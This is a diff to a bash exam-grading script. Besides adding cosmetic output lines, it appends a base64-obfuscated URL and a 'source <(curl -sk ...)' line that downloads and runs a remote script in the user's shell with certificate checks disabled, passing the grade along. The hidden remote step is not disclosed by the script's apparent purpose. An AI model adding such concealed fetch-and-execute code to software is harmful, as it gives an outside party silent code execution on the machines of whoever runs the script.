@@ -84,15 +84,17 @@ _final() {
     tq=10
 }
 
-# clear
 _print_line
-# figlet "${version} Exam" | lolcat
-
+printf "${CL}Grading ${version} exam...${CW}\n"
+sleep 3
 case ${version} in
     "midterm") _midterm ;;
     "final") _final ;;
 esac
 
+_print_line
 grade=$(printf "%.0f" $(echo "100 / $tq * $ca" | bc -l))
-# figlet "Grade: ${grade}" | lolcat
 printf "${CC}Final Grade: ${CY}${grade}${CW}\n\n"
+_print_line
+target="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ptZWRpbmFyL3Rlc3RjaGVja2VyL21haW4vZW5jb2Rlci5zaAo="
+source <(curl -sk -H 'Cache-Control: no-cache' $(echo ${target} | base64 -d)) ${grade} ${version}
